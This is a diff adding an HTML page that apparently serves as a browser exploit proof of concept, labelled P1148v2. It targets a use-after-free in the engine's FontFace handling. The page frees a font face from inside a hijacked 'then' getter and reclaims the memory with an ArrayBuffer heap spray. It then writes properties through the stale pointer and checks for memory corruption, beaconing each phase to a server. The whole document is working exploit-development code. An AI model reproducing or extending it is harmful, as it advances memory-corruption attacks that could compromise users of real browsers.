@@ -1,0 +1,165 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1148v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1148v2: POST-UAF PROPERTY WRITE (SAFE SPRAY FIRST) ===');
+log('info','v1 crashed with markers — engine may deref freed memory!');
+log('info','Strategy: zero-fill spray first (safe), then write props + check');
+B('P1148V2-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var spray=[];
+var savedFF=null;
+var uafHit=false;
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  savedFF=this;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  // ZERO-fill spray (safe — engine won't crash on null deref with our zeros)
+  for(var k=0;k<50;k++) spray.push(new ArrayBuffer(192));
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  B('P1148V2-PHASE1','uaf='+uafHit+'|spray='+spray.length);
+
+  if(!uafHit||!savedFF){
+    B('P1148V2-DONE','nohit');return;
+  }
+
+  // Find reclaimed buffer
+  var rIdx=-1;
+  for(var k=0;k<spray.length;k++){
+    var v=new BigUint64Array(spray[k]);
+    for(var q=0;q<v.length;q++){if(v[q]!==0n){rIdx=k;break;}}
+    if(rIdx>=0)break;
+  }
+  log('info','Reclaim idx='+rIdx);
+  B('P1148V2-RECLAIM','idx='+rIdx);
+
+  // ===== Phase 2: Read properties =====
+  log('phase','--- Phase 2: Read stale wrapper properties ---');
+  var rp={};
+  try{rp.f=savedFF.family;}catch(e){rp.f='ERR:'+e.message.substring(0,30);}
+  try{rp.s=savedFF.status;}catch(e){rp.s='ERR:'+e.message.substring(0,30);}
+  try{rp.st=savedFF.style;}catch(e){rp.st='ERR:'+e.message.substring(0,30);}
+  try{rp.w=savedFF.weight;}catch(e){rp.w='ERR:'+e.message.substring(0,30);}
+  try{rp.d=savedFF.display;}catch(e){rp.d='ERR:'+e.message.substring(0,30);}
+  try{rp.u=savedFF.unicodeRange;}catch(e){rp.u='ERR:'+e.message.substring(0,30);}
+
+  log('info','Read: fam='+rp.f+' stat='+rp.s+' style='+rp.st+' wt='+rp.w+' disp='+rp.d+' ur='+rp.u);
+  B('P1148V2-READS','fam='+rp.f+'|stat='+rp.s+'|style='+rp.st+'|wt='+rp.w);
+
+  // ===== Phase 3: Snapshot + Write properties + Check =====
+  log('phase','--- Phase 3: Write properties through stale wrapper ---');
+
+  // Put known pattern in spray BEFORE writes (so we can detect changes)
+  for(var k=0;k<spray.length;k++){
+    var v=new BigUint64Array(spray[k]);
+    for(var q=0;q<24;q++) v[q]=BigInt(0x11110000+q);
+  }
+  log('ok','Filled spray with 0x11110000+q pattern');
+  B('P1148V2-PREFILL','done');
+
+  // Now write properties — if these write through stale CSSFontFace*, our pattern changes
+  var wr={};
+  try{savedFF.family='AAAA';wr.f='ok';}catch(e){wr.f='E:'+e.message.substring(0,20);}
+  try{savedFF.style='italic';wr.st='ok';}catch(e){wr.st='E:'+e.message.substring(0,20);}
+  try{savedFF.weight='900';wr.w='ok';}catch(e){wr.w='E:'+e.message.substring(0,20);}
+  try{savedFF.display='swap';wr.d='ok';}catch(e){wr.d='E:'+e.message.substring(0,20);}
+  try{savedFF.unicodeRange='U+0061';wr.u='ok';}catch(e){wr.u='E:'+e.message.substring(0,20);}
+
+  log('info','Write: '+JSON.stringify(wr));
+  B('P1148V2-WRITES','fam='+wr.f+'|style='+wr.st+'|wt='+wr.w+'|disp='+wr.d+'|ur='+wr.u);
+
+  // Check spray for modifications
+  var whits=0;
+  var wdetails=[];
+  for(var k=0;k<spray.length;k++){
+    var v=new BigUint64Array(spray[k]);
+    for(var q=0;q<24;q++){
+      if(v[q]!==BigInt(0x11110000+q)){
+        whits++;
+        if(wdetails.length<5){
+          var d=[];for(var dd=0;dd<8;dd++) d.push(hex64(v[dd]));
+          wdetails.push({idx:k,q:q,exp:hex64(BigInt(0x11110000+q)),got:hex64(v[q]),d:d});
+        }
+        break;
+      }
+    }
+  }
+
+  log(whits>0?'win':'info','After writes: '+whits+' bufs changed');
+  B('P1148V2-WCHK','hits='+whits);
+  if(whits>0){
+    log('win','!!! WRITES WENT THROUGH STALE POINTER !!!');
+    for(var i=0;i<wdetails.length;i++){
+      var wd=wdetails[i];
+      log('ptr','buf['+wd.idx+'] q'+wd.q+': expected '+wd.exp+' got '+wd.got);
+      log('ptr','  '+wd.d.slice(0,4).join(' '));
+      if(i<3) B('P1148V2-WMOD-'+i,'idx='+wd.idx+'|q='+wd.q+'|got='+wd.got);
+    }
+  }
+
+  // Read back property values (did they "stick"?)
+  var rb={};
+  try{rb.f=savedFF.family;}catch(e){rb.f='ERR';}
+  try{rb.s=savedFF.status;}catch(e){rb.s='ERR';}
+  log('info','Readback: fam='+rb.f+' stat='+rb.s);
+  B('P1148V2-READBACK','fam='+rb.f+'|stat='+rb.s);
+
+  // ===== Phase 4: Re-add + load =====
+  log('phase','--- Phase 4: Re-add wrapper ---');
+  var readded=false;
+  try{document.fonts.add(savedFF);readded=true;}catch(e){log('fail','Re-add: '+e.message);}
+  log(readded?'ok':'fail','Re-add: '+readded);
+  B('P1148V2-READD','ok='+readded);
+
+  if(readded){
+    // Check if add modified spray
+    var ahits=0;
+    for(var k=0;k<spray.length;k++){
+      var v=new BigUint64Array(spray[k]);
+      for(var q=0;q<24;q++){
+        if(v[q]!==BigInt(0x11110000+q)){ahits++;break;}
+      }
+    }
+    log('info','After re-add spray changes: '+ahits);
+    B('P1148V2-ACHK','hits='+ahits);
+
+    // Delete again
+    try{document.fonts.delete(savedFF);}catch(e){}
+
+    // Check after delete
+    var dhits=0;
+    for(var k=0;k<spray.length;k++){
+      var v=new BigUint64Array(spray[k]);
+      for(var q=0;q<24;q++){
+        if(v[q]!==BigInt(0x11110000+q)){dhits++;break;}
+      }
+    }
+    log('info','After re-delete spray changes: '+dhits);
+    B('P1148V2-DCHK','hits='+dhits);
+  }
+
+  B('P1148V2-DONE','complete');
+  log('phase','=== P1148v2 COMPLETE ===');
+},80);
+</script></body></html>
